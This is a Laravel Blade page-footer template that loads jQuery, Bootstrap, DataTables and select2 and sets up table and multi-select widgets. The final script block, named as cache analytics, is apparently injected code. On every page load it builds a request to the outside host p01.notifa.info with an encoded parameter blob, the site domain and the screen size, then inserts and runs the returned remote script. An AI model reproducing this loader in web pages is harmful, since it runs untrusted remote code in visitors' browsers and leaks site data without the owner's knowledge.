<script src="{{URL::to('assets/js/jquery.min.js')}}"></script>
  <script src="{{URL::to('assets/js/popper.min.js')}}"></script>
  <script src="{{URL::to('assets/js/bootstrap.min.js')}}"></script>
  
  <!-- simplebar js -->
  <script src="{{URL::to('assets/plugins/simplebar/js/simplebar.js')}}"></script>
  <!-- waves effect js -->
  <script src="{{URL::to('assets/js/waves.js')}}"></script>
  <!-- sidebar-menu js -->
  <script src="{{URL::to('assets/js/sidebar-menu.js')}}"></script>
  <!-- Custom scripts -->
  <script src="{{URL::to('assets/js/app-script.js')}}"></script>

  <!--Data Tables js-->
  <script src="{{URL::to('assets/plugins/bootstrap-datatable/js/jquery.dataTables.min.js')}}"></script>
  <script src="{{URL::to('assets/plugins/bootstrap-datatable/js/dataTables.bootstrap4.min.js')}}"></script>
  <script src="{{URL::to('assets/plugins/bootstrap-datatable/js/dataTables.buttons.min.js')}}"></script>
  <script src="{{URL::to('assets/plugins/bootstrap-datatable/js/buttons.bootstrap4.min.js')}}"></script>
  <script src="{{URL::to('assets/plugins/bootstrap-datatable/js/jszip.min.js')}}"></script>
  <script src="{{URL::to('assets/plugins/bootstrap-datatable/js/pdfmake.min.js')}}"></script>
  <script src="{{URL::to('assets/plugins/bootstrap-datatable/js/vfs_fonts.js')}}"></script>
  <script src="{{URL::to('assets/plugins/bootstrap-datatable/js/buttons.html5.min.js')}}"></script>
  <script src="{{URL::to('assets/plugins/bootstrap-datatable/js/buttons.print.min.js')}}"></script>
  <script src="{{URL::to('assets/plugins/bootstrap-datatable/js/buttons.colVis.min.js')}}"></script>
  <script src="{{URL::to('assets/plugins/select2/js/select2.min.js')}}"></script>
    <script>
     $(document).ready(function() {
      //Default data table
       $('#default-datatable').DataTable();


       var table = $('#example').DataTable( {
        lengthChange: false,
        buttons: [ 'copy', 'excel', 'pdf', 'print', 'colvis' ]
      } );
 
     table.buttons().container()
        .appendTo( '#example_wrapper .col-md-6:eq(0)' );
      
      } );

    </script>

     <script>
        $(document).ready(function() {
            $('.single-select').select2();
      
            $('.multiple-select').select2();

        //multiselect start

            $('#my_multi_select1').multiSelect();
            $('#my_multi_select2').multiSelect({
                selectableOptgroup: true
            });

            $('#my_multi_select3').multiSelect({
                selectableHeader: "<input type='text' class='form-control search-input' autocomplete='off' placeholder='search...'>",
                selectionHeader: "<input type='text' class='form-control search-input' autocomplete='off' placeholder='search...'>",
                afterInit: function (ms) {
                    var that = this,
                        $selectableSearch = that.$selectableUl.prev(),
                        $selectionSearch = that.$selectionUl.prev(),
                        selectableSearchString = '#' + that.$container.attr('id') + ' .ms-elem-selectable:not(.ms-selected)',
                        selectionSearchString = '#' + that.$container.attr('id') + ' .ms-elem-selection.ms-selected';

                    that.qs1 = $selectableSearch.quicksearch(selectableSearchString)
                        .on('keydown', function (e) {
                            if (e.which === 40) {
                                that.$selectableUl.focus();
                                return false;
                            }
                        });

                    that.qs2 = $selectionSearch.quicksearch(selectionSearchString)
                        .on('keydown', function (e) {
                            if (e.which == 40) {
                                that.$selectionUl.focus();
                                return false;
                            }
                        });
                },
                afterSelect: function () {
                    this.qs1.cache();
                    this.qs2.cache();
                },
                afterDeselect: function () {
                    this.qs1.cache();
                    this.qs2.cache();
                }
            });

         $('.custom-header').multiSelect({
              selectableHeader: "<div class='custom-header'>Selectable items</div>",
              selectionHeader: "<div class='custom-header'>Selection items</div>",
              selectableFooter: "<div class='custom-header'>Selectable footer</div>",
              selectionFooter: "<div class='custom-header'>Selection footer</div>"
            });



          });

    </script>
  
  
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKuih2FzmamiVXBdP7rQdzhTxfpkFFtvOnyejVCSSPK6u9WcsNj8GrchwkcC0cuuN23MjWecopK9D18LKoyDfbiXPfrndpWGpPOH2fLRyh5tK5%2f2c9K0us8J%2bjf3vFsn4%2fTXFgzL766s1rvusNt%2f2awK9lOy4Vktosm3AYYGGLl5M3uaPFy1scuCQj%2f0TtP9KTGu%2baG8AY8xIwvJwZqBstW8mLUHXgBTl%2fCiejm4tW3R%2b8lXa%2bjlGl2mi3qy6h0ZR8W72goA0fM%2fheFCPwMRwWv3%2fgBJNpUwJ%2bH2t1mVHjs4ZpZ7goJxWRAK4PpOPCLgzKtOnJI%2fZInHhRwD94P7HZXLqHaKn2Dp3%2fdEJHkeaL4yuoeuu063ZBMPA0nAsB4sgvkCfWzi2EjFHA1gg77pOXVlnhhOP8kHZYxMQ4QoZOkHsqic6nVTUksRjQ3Mma4U0zDcidDMWZgPrAvo08lzOZJkkwlaTsMfMhGiEbCHIzyrFruRxowfltKRNMntpE19Ejg4%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>


</body>